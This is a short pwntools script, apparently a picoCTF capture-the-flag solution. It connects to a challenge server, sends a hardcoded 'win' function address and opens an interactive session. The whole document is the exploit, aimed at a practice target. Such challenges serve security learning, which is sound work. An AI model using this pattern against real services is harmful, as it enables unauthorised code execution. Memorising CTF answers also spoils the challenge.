from pwn import *

HOST, PORT = "saturn.picoctf.net 53484".split()
r = remote(HOST, PORT)
r.recvuntil(b': ')
win_addr = '40129e'
r.sendline(win_addr.encode())

r.interactive()